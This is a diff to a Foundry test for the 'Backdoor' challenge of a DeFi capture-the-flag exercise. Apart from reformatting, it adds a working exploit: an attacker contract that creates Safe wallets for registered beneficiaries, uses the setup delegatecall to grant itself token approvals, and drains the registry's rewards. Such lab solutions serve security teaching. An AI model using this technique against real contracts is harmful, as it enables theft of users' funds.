@@ -12,7 +12,12 @@ contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];
+    address[] users = [
+        makeAddr("alice"),
+        makeAddr("bob"),
+        makeAddr("charlie"),
+        makeAddr("david")
+    ];
 
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
 
@@ -41,7 +46,12 @@ contract BackdoorChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy the registry
-        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
+        walletRegistry = new WalletRegistry(
+            address(singletonCopy),
+            address(walletFactory),
+            address(token),
+            users
+        );
 
         // Transfer tokens to be distributed to the registry
         token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
@@ -54,7 +64,10 @@ contract BackdoorChallenge is Test {
      */
     function test_assertInitialState() public {
         assertEq(walletRegistry.owner(), deployer);
-        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
+        assertEq(
+            token.balanceOf(address(walletRegistry)),
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
         for (uint256 i = 0; i < users.length; i++) {
             // Users are registered as beneficiaries
             assertTrue(walletRegistry.beneficiaries(users[i]));
@@ -70,7 +83,14 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new BackdoorAttacker(
+            walletFactory,
+            singletonCopy,
+            walletRegistry,
+            token,
+            users,
+            recovery
+        );
     }
 
     /**
@@ -92,5 +112,63 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+// Separate contract deployed before the attacker, used as delegatecall target
+contract BackdoorHelper {
+    function approve(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
+contract BackdoorAttacker {
+    constructor(
+        SafeProxyFactory factory,
+        Safe singleton,
+        WalletRegistry registry,
+        DamnValuableToken token,
+        address[] memory beneficiaries,
+        address recovery
+    ) {
+        // Deploy helper first so its code exists for delegatecall
+        BackdoorHelper helper = new BackdoorHelper();
+
+        for (uint256 i = 0; i < beneficiaries.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = beneficiaries[i];
+
+            bytes memory payload = abi.encodeCall(
+                BackdoorHelper.approve,
+                (address(token), address(this))
+            );
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners, // _owners
+                    1, // _threshold
+                    address(helper), // to (delegatecall target - deployed helper)
+                    payload, // data
+                    address(0), // fallbackHandler
+                    address(0), // paymentToken
+                    0, // payment
+                    payable(address(0)) // paymentReceiver
+                )
+            );
+
+            SafeProxy proxy = factory.createProxyWithCallback(
+                address(singleton),
+                initializer,
+                i,
+                IProxyCreationCallback(address(registry))
+            );
+
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
     }
 }
